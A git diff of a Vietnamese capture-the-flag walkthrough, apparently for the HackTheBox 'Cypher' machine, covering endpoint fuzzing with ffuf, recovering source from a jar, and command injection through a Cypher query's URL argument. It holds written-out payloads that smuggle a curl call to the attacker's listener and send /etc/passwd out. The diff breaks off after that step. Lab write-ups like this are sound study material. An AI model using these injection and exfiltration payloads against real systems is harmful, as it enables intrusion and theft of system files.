@@ -19,7 +19,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
 ```
 
-Sau khi truy cập trên trình duyệt thì hiện ra trang web này, tôi có fuzz các endpoint, dir, subdomain nhưng không ra được kết quả khả quan lắm
+Sau khi truy cập trên trình duyệt thì hiện ra trang web này, tôi có fuzz subdomain nhưng không ra được kết quả khả quan lắm
 
 <img width="1862" height="952" alt="image" src="https://github.com/user-attachments/assets/6bb9022c-8df0-41fc-ab89-0948e5e7ab14" />
 
@@ -42,6 +42,116 @@ Với đoạn hash ở đây là hash của `test` và khi mật khẩu trùng k
 <img width="1498" height="649" alt="image" src="https://github.com/user-attachments/assets/12ca30d9-9504-4261-9b00-4cc416e85a55" />
 
 Và có được cookie là `access-token`, sử dụng `Match and replace` để tiếp tục truy cập:
+
+<img width="1039" height="685" alt="image" src="https://github.com/user-attachments/assets/07a24409-be70-4d7d-b650-a4522011fcd2" />
+
+Và đây là trang demo:
+
+<img width="1870" height="956" alt="image" src="https://github.com/user-attachments/assets/c7c416ff-b6c0-4240-9ab1-b3b99bd4748f" />
+
+Tôi fuzz endpoint thì có cái `testing` nhìn đặc biệt:
+```
+❯ ffuf -u "http://cypher.htb/FUZZ" -w wordlist/super_mega_wordlist.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://cypher.htb/FUZZ
+ :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/super_mega_wordlist.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 53ms]
+api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
+api/                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
+demo/                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
+demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
+index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 83ms]
+index.html              [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 55ms]
+login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 53ms]
+login.html              [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 54ms]
+testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 53ms]
+utils.js                [Status: 200, Size: 1548, Words: 325, Lines: 64, Duration: 54ms]
+:: Progress: [78884/78884] :: Job [1/1] :: 724 req/sec :: Duration: [0:01:52] :: Errors: 2 ::
+```
+Ở đây có xuất hiện file jar:
+
+<img width="709" height="318" alt="image" src="https://github.com/user-attachments/assets/17e5ce68-f969-46ab-bc37-5044eb1d53f2" />
+
+Mở ra thì là src code của website, để ý dòng 29 là dòng dẫn đến cmdi:
+
+<img width="1534" height="954" alt="image" src="https://github.com/user-attachments/assets/98331f14-930f-49bc-8bf5-d1306da42341" />
+
+Khi tôi sử dụng:
+
+```
+MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://10.10.14.8:8888/") YIELD statusCode RETURN n.data, statusCode
+```
+
+Thì có request được gửi tới máy của tôi, cái này thì chỉ để check rằng web hoạt động ổn:
+
+```
+❯ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:02] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:03] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:04] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:05] "GET / HTTP/1.1" 200 -
+10.10.11.57 - - [18/Sep/2025 12:48:06] "GET / HTTP/1.1" 200 -
+```
+
+Để khai thác được cmdi thì tôi inject vào url 
+
+```
+MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://test.com; curl http://10.10.14.8:8888/submit?lmao=hihi") YIELD statusCode RETURN n.data, statusCode
+```
+Chứng minh được có cmdi:
+
+<img width="848" height="527" alt="image" src="https://github.com/user-attachments/assets/f333a40f-75d3-439a-8067-87811956714d" />
+
+Tôi lấy đoạn script python để bắt các request post `server.py`
+
+Tôi mở file `/etc/passwd`
+
+```
+MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://test.com; curl http://10.10.14.8:8888/submit?data=$(cat /etc/passwd)") YIELD statusCode RETURN n.data, statusCode
+```
+
 
 
 
